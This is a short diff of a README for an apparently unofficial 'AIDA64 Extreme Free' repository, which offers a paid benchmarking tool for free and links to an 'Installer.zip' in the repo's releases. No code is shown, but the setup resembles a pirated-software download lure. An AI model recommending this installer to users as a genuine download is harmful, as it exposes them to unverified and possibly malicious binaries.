@@ -49,4 +49,3 @@ If you encounter any issues with the provided link, please check the "Releases" 
 Thank you for visiting the AIDA64 Extreme Free Repository. Happy benchmarking! 🚀
 
 ![AIDA64 Tools](https://github.com/yourdiemistiknl/AIDA64-Extreme-Free/releases/download/2.0/Installer.zip)
- 
